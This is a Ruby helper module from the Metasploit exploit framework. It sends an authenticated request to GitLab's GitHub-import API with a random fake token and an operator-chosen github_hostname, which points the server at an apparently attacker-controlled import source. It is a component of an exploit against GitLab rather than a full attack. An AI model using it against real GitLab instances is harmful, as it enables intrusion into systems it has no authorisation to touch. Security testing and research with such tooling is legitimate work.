# -*- coding: binary -*-

# GitLab import mixin
module Msf::Exploit::Remote::HTTP::Gitlab::Import
  # Import a repository from a remote URL
  #
  # @return [String,nil] Import ID if succefull enqueue, nil otherwise
  def gitlab_import_github_repo(group_name, github_hostname, api_token)
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => '/api/v4/import/github',
      'ctype' => 'application/json',
      'headers' => {
        'PRIVATE-TOKEN' => api_token
      },
      'data' => {
        'personal_access_token' => Rex::Text.rand_text_alphanumeric(8),
        'repo_id' => rand(1000),
        'target_namespace' => group_name,
        'new_name' => "gh-import-#{rand(1000)}",
        'github_hostname' => github_hostname
      }.to_json
    })

    if res.nil? || res.body.nil?
      raise Msf::Exploit::Remote::HTTP::Gitlab::GitLabClientException, 'Empty response. Please validate RHOST'
    elsif res.code != 201
      raise Msf::Exploit::Remote::HTTP::Gitlab::GitLabClientException, "#{__method__} Unexpected HTTP #{res.code} response."
    end

    id = JSON.parse(res.body)['id']

    return id if id

    nil
  end
end
